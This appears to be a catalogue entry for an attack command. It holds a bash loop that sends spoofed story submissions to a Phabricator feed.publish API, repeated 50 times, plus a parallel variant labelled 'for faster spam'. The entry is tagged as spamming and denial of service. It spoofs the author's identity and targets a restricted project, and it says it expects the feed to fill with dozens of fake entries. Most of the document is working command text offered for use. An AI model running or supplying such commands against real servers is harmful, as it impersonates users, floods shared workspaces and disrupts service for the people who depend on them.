---
id: cmd-uuid-5
data: >-
  for i in {1..50}; do curl -X POST
  'https://phabricator.example.com/api/feed.publish' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}';
  done
tags:
  - spamming
  - dos
  - phabricator
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.047Z'
verified: false
validated: true
submitted: true
---
# curl-spam-phabricator-feed

## Command

```bash
for i in {1..50}; do \
  curl -X POST 'https://phabricator.example.com/api/feed.publish' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}'; \
done
```

## Description

Loops curl submissions to spam Phabricator feed with spoofed stories.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for i in {1..50}` | Loop 50 times | Yes |
| `curl ...` | Inner API call | Yes |

## Examples

### Basic Usage

```bash
for i in {1..50}; do curl -X POST 'https://phabricator.example.com/api/feed.publish' -H 'Content-Type: application/x-www-form-urlencoded' -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}'; done
```

### Advanced Usage

```bash
for i in {1..100}; do curl ... & done  # Parallel for faster spam
```

## Expected Output

Multiple JSON responses; feed fills with 50+ entries.

## Related

- [[Related Procedure]]
